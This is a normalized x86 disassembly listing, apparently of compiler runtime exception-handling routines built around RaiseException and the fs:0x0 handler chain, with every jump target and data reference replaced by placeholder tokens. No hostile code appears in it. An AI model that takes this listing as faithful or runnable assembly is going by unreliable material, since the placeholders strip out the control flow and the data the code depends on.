push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_44ebd4
pop ecx
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
cmp ebx 0x80
ja r-xdata
call sub_45465c
call sub_401140
test [ eax + 0x14 ] 0x1
je r-xdata
call sub_401140
or [ eax + 0x14 ] 0x1
call sub_401140
mov eax [ eax + 0x24 ]
pop ebx
pop ebp
retn
sub_455e43
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_401140
cmp ebx [ eax + 0x24 ]
jne r-xdata
push ebx
call sub_44ebe4
pop ecx
pop ebx
pop ebp
retn
call sub_401140
and [ eax + 0x14 ] 0xfffffffe
pop ebx
pop ebp
retn
sub_455e70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push 0x0
push esi
push edi
call sub_44f9e8
add esp 0x10
test eax eax
je r-xdata
movzx edx [ edi + 0x4 ]
mov [ ebp - 0x4 ] edx
movzx ebx [ esi + 0x4 ]
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax 0x1
jmp r-xdata
test bl 0x20
je r-xdata
test bl 0x20
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl 0x10
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ esi + 0x8 ]
push edi
call sub_44f9e8
add esp 0x10
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x20
jne r-xdata
xor eax eax
test [ ebp + 0x14 ] 0x1
je r-xdata
mov esi [ esi + 0x8 ]
movzx ebx [ esi + 0x4 ]
test bl 0x10
jne r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
push [ esi + 0x8 ]
push [ edi + 0x8 ]
call sub_44f9e8
add esp 0x10
test eax eax
je r-xdata
push 0x197
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ ebp - 0x4 ] 0x10
jne r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push esi
push edi
call sub_44f9e8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
test bl 0x40
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
test bh 0x1
jne r-xdata
test bh 0x2
jne r-xdata
test [ ebp - 0x3 ] 0x1
jne r-xdata
mov eax 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x2
jne r-xdata
sub_455f7f
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
test bh 0x1
mov esi [ ebp + 0x8 ]
jne r-xdata
test bl 0x80
je r-xdata
test bl 0x20
je r-xdata
test bh 0x10
je r-xdata
push 0x207
push rw-data
push rw-data
call sub_454374
add esp 0xc
push 0x205
push rw-data
push rw-data
call sub_454374
add esp 0xc
and ebx 0x7
dec ebx
je r-xdata
and ebx 0x7
dec ebx
je r-xdata
push edi
push esi
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
dec ebx
je r-xdata
push edi
push 0x0
push esi
call [ ebp + 0x10 ]
add esp 0xc
jmp r-xdata
dec ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push esi
push edi
call [ ebp + 0x10 ]
jmp r-xdata
dec ebx
je r-xdata
push 0x0
push edi
push esi
call [ ebp + 0x10 ]
jmp r-xdata
dec ebx
je r-xdata
mov edx edi
mov eax esi
call [ ebp + 0x10 ]
jmp r-xdata
sub ebx 0x2
je r-xdata
mov ecx edi
xor edx edx
mov eax esi
call [ ebp + 0x10 ]
jmp r-xdata
sub ebx 0x2
je r-xdata
push edi
push esi
call [ ebp + 0x10 ]
jmp r-xdata
jmp r-xdata
push edi
push 0x0
push esi
call [ ebp + 0x10 ]
jmp r-xdata
jmp r-xdata
mov edx rw-data
test edx edx
je r-xdata
mov eax rw-data
test eax eax
je r-xdata
push 0x25e
push rw-data
push rw-data
call sub_454374
add esp 0xc
push 0x232
push rw-data
push rw-data
call sub_454374
add esp 0xc
jmp r-xdata
sub_45608d
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
test edx edx
je r-xdata
pop ebp
retn
jmp r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
inc eax
sub_4560a5
push ebp
mov ebp esp
push ebx
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
inc eax
inc eax
push eax
push 0x0
push 0xeedfae6
call RaiseException
pop ebx
pop ebp
retn
sub_4560c2
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx 0x2
cmp [ ebp + 0x1c ] 0x0
mov esi [ ebp + 0x18 ]
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
add ebx 0xfffffffe
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
or ebx 0x80
test esi 0x80
je r-xdata
push [ ebp + 0xc ]
call sub_44f8d4
pop ecx
mov edi eax
push edi
call sub_45608d
pop ecx
push eax
push edi
push [ ebp + 0x14 ]
push 0x3
push 0x0
call sub_4560a5
add esp 0x14
and esi 0x7
dec esi
je r-xdata
push 0x2cd
push rw-data
push rw-data
call sub_454374
add esp 0xc
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec esi
je r-xdata
mov edx ebx
mov eax [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub esi 0x2
je r-xdata
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
jmp r-xdata
mov ecx rw-data
test ecx ecx
je r-xdata
push 0x2f4
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub_456191
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
test bl 0x80
je r-xdata
and ebx 0x7
dec ebx
je r-xdata
push 0x2fc
push rw-data
push rw-data
call sub_454374
add esp 0xc
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ecx
pop ebx
pop ebp
retn
dec ebx
je r-xdata
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
dec ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
sub ebx 0x2
je r-xdata
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
jmp r-xdata
mov edx rw-data
test edx edx
je r-xdata
pop ebx
pop ebp
retn
push 0x323
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub_45620f
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov eax rw-data
call sub_44f3b0
mov esi [ ebp + 0x8 ]
call sub_401140
or [ eax + 0x14 ] 0x2
call sub_401140
test esi esi
je r-xdata
xor edx edx
movzx edx [ esi + 0x6 ]
add edx esi
jmp r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x2c ] 0x0
je r-xdata
mov [ eax + 0x20 ] edx
call sub_401140
mov ecx [ ebp + 0x20 ]
mov [ eax + 0x1c ] ecx
call sub_401140
mov edx [ ebp + 0x24 ]
test esi esi
mov [ eax + 0x18 ] edx
jne r-xdata
test [ ebp + 0x1c ] 0x4
je r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
push 0x373
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ ebp + 0x1c ] 0x4
jne r-xdata
mov [ ebp - 0x28 ] esi
movzx edi [ esi + 0x4 ]
test edi 0x2
mov ebx [ esi ]
je r-xdata
mov [ ebp - 0x28 ] esi
test esi esi
je r-xdata
test [ esi + 0xc ] 0x80
jne r-xdata
xor eax eax
mov eax [ esi + 0xc ]
jmp r-xdata
sub [ ebp + 0x28 ] 0x4
push [ ebp - 0x28 ]
push [ ebp + 0x3a ]
push [ ebp + 0x39 ]
push [ ebp + 0x37 ]
push [ ebp + 0x38 ]
push [ ebp + 0x35 ]
push [ ebp + 0xc ]
push [ ebp + 0x28 ]
push esp
push 0x8
push 0xc0000025
push 0xeedfade
call RaiseException
test [ esi + 0x4 ] 0x30
je r-xdata
lea eax [ ebx + 0x52 ]
push eax
call sub_455df9
pop ecx
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x4 ] esi
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x1c ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x10 ] ebx
mov edx [ ebp - 0x30 ]
mov [ edx + 0x18 ] di
mov ecx [ ebp - 0x30 ]
mov ax [ ebp - 0x2c ]
mov [ ecx + 0x1a ] ax
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp + 0x10 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx + 0x28 ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx + 0x2c ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x1c ] sub_455e43
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x20 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp + 0x24 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ebp + 0x14 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x18 ]
mov [ edx + 0x24 ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x45 ] 0x0
mov edx [ ebp - 0x30 ]
mov [ edx + 0x44 ] 0x1
push ebx
push [ ebp + 0xc ]
mov ecx [ ebp - 0x30 ]
add ecx 0x52
push ecx
call sub_44f024
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0x1
je r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x28 ] ecx
test edi 0x30
mov [ ebp - 0x2c ] eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x28 ] ecx
push esi
call sub_44f8d4
mov ebx eax
mov eax [ ebp + 0x34 ]
pop ecx
push [ eax + 0x18 ]
mov edx [ ebp + 0x34 ]
push [ edx + 0x14 ]
mov ecx [ ebp + 0x34 ]
push [ ecx + 0x10 ]
mov eax [ ebp + 0x34 ]
push [ eax + 0xc ]
mov edx [ ebp + 0x34 ]
push [ edx + 0x8 ]
mov ecx [ ebp + 0x34 ]
push [ ecx + 0x4 ]
mov eax [ ebp + 0x34 ]
push [ eax ]
mov edx [ ebp - 0x30 ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x40 ]
mov ecx [ ebp - 0x30 ]
add ecx 0x52
jmp r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
call sub_401140
mov eax [ eax + 0x20 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x40 ]
mov edx [ ebp + 0x28 ]
mov [ ebp - 0x3c ] edx
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] ecx
push eax
push 0x3
push 0x1
push 0xeefface
call RaiseException
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push ecx
push ebx
call sub_45608d
pop ecx
push eax
push ebx
mov edx [ ebp + 0x28 ]
sub edx 0x5
push edx
push 0xb
push 0x1
call sub_4560a5
add esp 0x34
mov eax [ rw-data ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x14 ] 0x8
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
mov edx [ ebp - 0x30 ]
add edx 0x52
push edx
call sub_455f7f
mov [ ebp - 0x14 ] 0x0
add esp 0x10
jmp r-xdata
push 0x445
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebp - 0x34 ]
mov [ rw-data ] ecx
sub_4564e0
mov ecx esp
add ecx 0x4
push ecx
push ebp
push esi
push edi
push edx
push ebx
push eax
push esp
push [ ecx + 0x20 ]
push 0x0
push [ ecx - 0x4 ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x14 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call sub_45620f
add esp 0x4c
retn
sub_456515
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ecx ebp
add ecx 0x8
push ecx
push [ ebp ]
push esi
push edi
push edx
push ebx
push eax
mov [ ebp - 0x4 ] esp
mov eax ebp
mov esi [ eax + 0x4 ]
call sub_401140
mov ebx [ eax + 0x10 ]
test ebx ebx
jne r-xdata
test [ ebx + 0xc ] 0x4
je r-xdata
call sub_44ff18
cmp [ ebx + 0x44 ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
lea eax [ ebx + 0x52 ]
jmp r-xdata
mov eax [ ebx + 0x52 ]
jmp r-xdata
push 0x551
push rw-data
push rw-data
call sub_454374
add esp 0xc
or [ ebx + 0xc ] 0x8
push [ ebp - 0x4 ]
push 0x0
push 0x1
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0xc ]
push [ ebx + 0x24 ]
push [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
push [ ebx + 0x4 ]
call sub_45620f
add esp 0x30
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4565ac
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
or [ ebx + 0x4 ] 0x2
mov eax 0x7b
mov edx 0x7b
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_45020e
xor [ ebx + 0x4 ] 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x50 ] 0x26
mov [ ebp - 0x4c ] 0x2
xor eax eax
lea ebx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
sub_4565f1
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
call sub_44f3b0
test ebx ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x8
push 0x1
push [ ebp + 0x14 ]
push ebx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4560c2
mov [ ebp - 0x14 ] 0x0
add esp 0x18
jmp r-xdata
push 0x5b9
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456666
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x44 ] 0x0
je r-xdata
cmp [ ebx + 0x45 ] 0x0
je r-xdata
test [ ebx + 0x1a ] 0x2
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi [ ebx + 0x3c ]
test esi esi
jne r-xdata
mov [ ebx + 0x44 ] 0x0
mov eax [ ebx + 0x14 ]
mov esi [ rw-data ]
lea edx [ ebx + 0x52 ]
test [ eax + 0xc ] 0x80
je r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
push 0x5fe
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebx + 0xc ]
and ecx 0xc
cmp ecx 0xc
je r-xdata
mov edx [ edx ]
mov [ ebx + 0x45 ] 0x0
test [ esi + 0xc ] 0x2
je r-xdata
mov [ rw-data ] esi
movzx ecx [ eax + 0x2c ]
push ecx
push [ eax + 0x28 ]
push eax
push edx
call sub_4565f1
add esp 0x10
movzx eax [ esi + 0x2c ]
push eax
push [ esi + 0x28 ]
push esi
push [ ebx + 0x40 ]
call sub_4565f1
add esp 0x10
sub_456701
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] esi
call sub_401140
cmp [ eax + 0x10 ] 0x0
jne r-xdata
call sub_401140
mov ebx [ eax + 0x10 ]
call sub_401140
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x4 ] eax
mov esi [ fs : 0x0 ]
test esi esi
jne r-xdata
push 0x629
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp esi [ ebx + 0x28 ]
je r-xdata
push 0x637
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
movzx edx [ eax + 0x10 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov dx [ eax + edx ]
mov [ ecx + 0x10 ] dx
push ebx
call sub_456666
pop ecx
mov esi [ ebx + 0xc ]
and esi 0x2
test esi esi
push ebx
call [ ebx + 0x1c ]
pop ecx
test esi esi
je r-xdata
push 0x638
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
mov eax ebp
mov eax [ ebp + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ebp [ ebp ]
mov esp edx
push eax
retn
push [ ebp + 0x4 ]
push 0x1
push 0x6
call sub_4560a5
add esp 0xc
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ ebp - 0x14 ] ecx
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov esp ebp
pop ebp
pop eax
mov esp edx
push eax
retn
push [ ebp + 0x4 ]
push 0x1
push 0x6
call sub_4560a5
add esp 0xc
sub_456834
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push 0x56
call sub_455df9
pop ecx
mov ebx eax
call sub_401140
mov eax [ eax + 0x10 ]
mov [ ebx ] eax
call sub_401140
mov [ eax + 0x10 ] ebx
mov edx [ ebp + 0x10 ]
cmp [ edx + 0x10 ] 0x8
jne r-xdata
test [ esi + 0x4 ] 0x30
jne r-xdata
mov eax esi
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x30 ]
mov [ ebx + 0x14 ] eax
test eax eax
je r-xdata
push 0x6b2
push rw-data
push rw-data
call sub_454374
add esp 0xc
xor ecx ecx
mov ecx [ esi + 0x8 ]
jmp r-xdata
xor edx edx
mov dx [ eax + 0xc ]
jmp r-xdata
xor edx edx
mov edx [ esi + 0x8 ]
mov dx [ edx + 0xc ]
jmp r-xdata
mov [ ebx + 0x14 ] ecx
test esi esi
je r-xdata
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] 0x4
mov [ ebx + 0x10 ] 0x4
test eax eax
je r-xdata
mov [ ebx + 0x1a ] dx
jmp r-xdata
xor eax eax
mov ax [ eax + 0x4 ]
jmp r-xdata
mov [ ebx + 0x1a ] dx
pop edi
pop esi
pop ebx
pop ebp
retn
test [ edi + 0x8 ] 0x80
jne r-xdata
mov [ ebx + 0x18 ] ax
xor edx edx
mov [ ebx + 0x8 ] edx
xor eax eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x2c ] edi
mov [ ebx + 0x1c ] sub_455e43
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x38 ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x45 ] 0x0
mov [ ebx + 0x44 ] 0x1
mov [ ebx + 0x3c ] esi
test esi esi
mov edx [ ebp + 0x1c ]
mov [ ebx + 0x30 ] edx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ ebx + 0x52 ] eax
je r-xdata
mov [ ebx + 0x45 ] 0x1
mov edx [ ebp + 0x14 ]
lea eax [ ebx + 0x52 ]
mov ecx [ edx ]
add ecx [ ebp + 0x18 ]
mov [ ebx + 0x40 ] ecx
mov edx [ ebx + 0x40 ]
mov eax [ eax ]
mov [ edx ] eax
sub_456956
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov eax [ ebx + 0x28 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov edx [ ebx + 0x2c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
push 0x722
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp [ ebx + 0x45 ] 0x0
je r-xdata
push 0x723
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x3c ] eax
test eax eax
je r-xdata
push 0x725
push rw-data
push rw-data
call sub_454374
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test [ edx + 0x8 ] 0x80
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi eax
test [ ecx + 0x8 ] 0x1
sete dl
and edx 0x1
lea ecx [ ebx + 0x52 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov [ ebx + 0x45 ] 0x1
mov edx [ ebp + 0x14 ]
mov ecx [ edx ]
add ecx [ ebp + 0x18 ]
mov [ ebx + 0x40 ] ecx
movzx eax [ esi + 0x4 ]
mov edx eax
test al 0x30
mov edi [ esi ]
je r-xdata
test al 0x10
je r-xdata
mov esi [ esi + 0x8 ]
movzx edx [ esi + 0x4 ]
test dl 0x1
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
test [ ebx + 0x18 ] 0x1
je r-xdata
test al 0x30
je r-xdata
push edi
push 0x0
push [ ebx + 0x40 ]
call sub_44f094
mov [ ebp - 0x8 ] 0x1
add esp 0xc
jmp r-xdata
test al 0x20
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x14 ]
je r-xdata
test al 0x20
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp edi [ ebx + 0x10 ]
je r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebx + 0x40 ]
call sub_44f024
mov [ ebp - 0x8 ] 0x1
add esp 0xc
jmp r-xdata
push esi
push [ ebx + 0x14 ]
call sub_44f90c
add esp 0x8
test eax eax
jne r-xdata
push 0x7b6
push rw-data
push rw-data
call sub_454374
add esp 0xc
test al 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x10
je r-xdata
test [ esi + 0xc ] 0x2
je r-xdata
push edi
push [ ebp - 0x4 ]
push [ ebx + 0x40 ]
call sub_44f024
add esp 0xc
push 0x7f8
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ esi + 0xc ] 0x1
je r-xdata
push esi
push [ ebx + 0x14 ]
push [ ebp - 0x4 ]
call sub_44fd04
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
test [ ebx + 0x18 ] 0x10
jne r-xdata
push 0x795
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov [ ebp - 0x8 ] 0x1
test [ ebx + 0xc ] 0x2
je r-xdata
push 0x782
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov [ ebx + 0x44 ] 0x0
movzx edx [ esi + 0x2c ]
push edx
push [ esi + 0x28 ]
push esi
push [ ebp - 0x4 ]
call sub_4565f1
add esp 0x10
push edi
push [ ebp - 0x4 ]
push [ ebx + 0x40 ]
call sub_44f024
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
push 0x796
push rw-data
push rw-data
call sub_454374
add esp 0xc
push esi
push [ ebx + 0x14 ]
call sub_44f90c
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push [ edx + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ecx + 0xc ]
push [ ebp - 0x4 ]
push [ ebx + 0x40 ]
call sub_455f7f
mov [ ebp - 0x8 ] 0x1
add esp 0x10
jmp r-xdata
push 0x7d0
push rw-data
push rw-data
call sub_454374
add esp 0xc
push edi
lea edx [ ebp - 0x4 ]
push edx
push [ ebx + 0x40 ]
call sub_44f024
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] ecx
push esi
push [ ebx + 0x14 ]
push [ ebp - 0x4 ]
call sub_44fd04
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ebp - 0x8 ] 0x1
sub_456c2d
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x8 ]
movzx ebx [ ecx + 0x10 ]
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx edi [ edx + eax ]
add eax 0x2
mov edx [ ebp - 0x4 ]
movzx edx [ edx + eax ]
mov [ ecx + 0x10 ] di
add eax 0x2
sub edx 0x1
jb r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx + eax + 0x4 ]
mov [ rw-data ] eax
mov [ ecx + 0x12 ] 0x1
push ebx
push ebp
push esi
push edi
mov ecx 0x7b
mov ebx 0x7b
mov ecx [ ebp - 0x8 ]
mov ebx rw-data
call sub_450223
pop edi
pop esi
pop ebp
pop ebx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x12 ] 0x0
jmp r-xdata
sub edx 0x3
jb r-xdata
mov ebx edi
je r-xdata
call sub_401140
add eax 0x10
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ecx ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + eax ]
add eax 0x4
mov eax [ ecx + eax ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
push edx
push eax
call sub_4579e9
add esp 0x10
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x28 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
test esi esi
je r-xdata
mov eax rw-data
test eax eax
je r-xdata
mov [ ebp - 0x10 ] esi
cmp ebx [ esi + 0x30 ]
je r-xdata
push 0x8ba
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp - 0x10 ]
cmp esi [ eax ]
je r-xdata
push 0x8e9
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
push esi
call sub_456666
pop ecx
push esi
call [ esi + 0x1c ]
pop ecx
jmp r-xdata
sub_456dab
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
call sub_456c2d
add esp 0x8
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
pop ebx
pop ebp
retn
sub_456dc7
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
test [ eax + 0x4 ] 0x30
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x14
push eax
call sub_44f8d4
pop ecx
mov esi eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x9
push rw-data
push ebx
call sub_44f240
add esp 0xc
test eax eax
jne r-xdata
add esi 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
add esi 0x9
mov ebx esi
push 0x6
push rw-data
push ebx
call sub_44f240
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movsx eax [ ebx ]
cmp eax 0x3a
jne r-xdata
movsx eax [ esi ]
cmp eax 0x3a
jne r-xdata
inc ebx
mov esi ebx
push esi
call sub_44f174
pop ecx
mov ebx eax
sub ebx 0x2
cmp ebx 0xff
jg r-xdata
inc esi
push ebx
push esi
lea eax [ ebp - 0xff ]
push eax
